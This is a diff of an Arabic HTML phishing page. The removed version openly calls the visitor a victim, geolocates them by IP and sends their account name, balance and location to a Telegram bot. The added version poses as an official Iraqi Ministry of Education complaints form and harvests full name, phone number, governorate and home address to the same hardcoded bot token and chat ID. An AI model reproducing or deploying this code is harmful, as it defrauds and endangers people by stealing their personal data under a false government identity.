@@ -1,85 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>موقع لزهراء متطور</title>
+    <meta charset="UTF-8">
+    <title>بلاغات وزارة التربية</title>
     <style>
-        body {
-            background: url('https://i.pinimg.com/736x/6a/6a/e0/6a6ae0e9175f7f99ee86aa2ea0129526.jpg') no-repeat center center fixed;
-            background-size: cover;
-            text-align: center;
-            padding: 100px;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-shadow: 2px 2px 4px #000000;
-        }
-        .form-container {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 15px;
-            display: inline-block;
-        }
-        input, button {
-            padding: 12px;
-            margin: 10px;
-            font-size: 18px;
-            border: none;
-            border-radius: 5px;
-        }
-        button {
-            background-color: #FF0000;
-            color: white;
-            cursor: pointer;
-            font-weight: bold;
-        }
+        body { font-family: 'Segoe UI', Tahoma; background: #f0f5ff; color: #003366; }
+        .container { max-width: 700px; margin: 20px auto; padding: 25px; border: 2px solid #d4d4d4; border-radius: 15px; background: white; }
+        h1 { color: #cc0000; text-align: center; border-bottom: 3px solid #cc0000; padding-bottom: 10px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #cc0000; color: white; border: none; padding: 15px; width: 100%; font-size: 18px; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #990000; }
+        .note { color: #cc0000; font-size: 14px; margin-top: -10px; }
     </style>
-    <script>
-        async function getShit() {
-            // تتبع الموقع يا خول
-            let locationShit = "غير معروف";
-            
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                locationShit = `${ipData.city}, ${ipData.region}, ${ipData.country_name} | ${ipData.ip}`;
-            } catch (error) {
-                locationShit = "فشل التتبع يا فاشل";
-            }
-
-            return locationShit;
-        }
-
-        async function sendToTelegram() {
-            const token = '8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog';
-            const chatId = '7763665935';
-            
-            const account = document.getElementById('account').value;
-            const balance = document.getElementById('balance').value;
-            const location = await getShit();
-
-            const message = 
-                `🔥 ضحية جديدة 🔥\n\n` +
-                `👤 الحساب: ${account}\n` +
-                `💳 الرصيد: ${balance}\n\n` +
-                `📍 الموقع: ${location}\n` +
-                `🕒 الوقت: ${new Date().toLocaleString()}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-                alert('تم سرقة بيانات الضحية وتحديد موقعها!');
-            } catch (error) {
-                alert(`خطأ في النصب: ${error.message}`);
-            }
-        }
-    </script>
 </head>
 <body>
-    <div class="form-container">
-        <h1>👁️ كاميرا برصيد - 👁️</h1>
-        <form onsubmit="event.preventDefault(); sendToTelegram()">
-            <input type="text" id="account" placeholder="اسم " required><br>
-            <input type="number" id="balance" placeholder="رقم الرصيد " required><br>
-            <button type="submit">سحب البيانات </button>
+    <div class="container">
+        <h1>نظام البلاغات الرسمي - وزارة التربية</h1>
+        <form id="reportForm">
+            <div class="form-group">
+                <label for="fullName">الاسم الثلاثي (مطلوب)</label>
+                <input type="text" id="fullName" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف (مطلوب)</label>
+                <input type="tel" id="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="problem">وصف المشكلة (أرفق رابط الصورة هنا إن أمكن)</label>
+                <textarea id="problem" maxlength="300" required></textarea>
+                <p class="note">ملاحظة: لا يمكن رفع الملفات مباشرة. أضف وصفاً مفصلاً للمشكلة</p>
+            </div>
+            <div class="form-group">
+                <label for="governorate">المحافظة</label>
+                <select id="governorate" required>
+                    <option value="">اختر المحافظة</option>
+                    <option value="بغداد">بغداد</option>
+                    <option value="البصرة">البصرة</option>
+                    <option value="نينوى">نينوى</option>
+                    <option value="أربيل">أربيل</option>
+                    <option value="السليمانية">السليمانية</option>
+                    <option value="دهوك">دهوك</option>
+                    <option value="كركوك">كركوك</option>
+                    <option value="ديالى">ديالى</option>
+                    <option value="صلاح الدين">صلاح الدين</option>
+                    <option value="الأنبار">الأنبار</option>
+                    <option value="بابل">بابل</option>
+                    <option value="كربلاء">كربلاء</option>
+                    <option value="النجف">النجف</option>
+                    <option value="المثنى">المثنى</option>
+                    <option value="القادسية">القادسية</option>
+                    <option value="واسط">واسط</option>
+                    <option value="ميسان">ميسان</option>
+                    <option value="ذي قار">ذي قار</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="location">موقع منزلك الدقيق (وصف يدوي)</label>
+                <input type="text" id="location" placeholder="الحي، الشارع، رقم الدار" required>
+            </div>
+            <button type="submit">أرسل البلاغ</button>
         </form>
     </div>
+
+    <script>
+    document.getElementById('reportForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const fullName = document.getElementById('fullName').value;
+        const phone = document.getElementById('phone').value;
+        const problem = document.getElementById('problem').value;
+        const governorate = document.getElementById('governorate').value;
+        const location = document.getElementById('location').value;
+        
+        const message = `🚨 بلاغ جديد:\n`
+            + `👤 الاسم: ${fullName}\n`
+            + `📱 الهاتف: ${phone}\n`
+            + `📝 المشكلة: ${problem}\n`
+            + `📍 المحافظة: ${governorate}\n`
+            + `🏠 الموقع: ${location}\n\n`
+            + `⚠️ ملاحظة: على المستخدم إرسال الصورة يدوياً للبوت`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog/sendMessage?chat_id=7763665935&text=${encodeURIComponent(message)}`);
+            alert('تم إرسال البلاغ! سيتم التواصل معك عبر الرقم المذكور');
+            document.getElementById('reportForm').reset();
+        } catch (error) {
+            alert('خطأ في الإرسال! تأكد من اتصال الإنترنت');
+        }
+    });
+    </script>
 </body>
     </html>
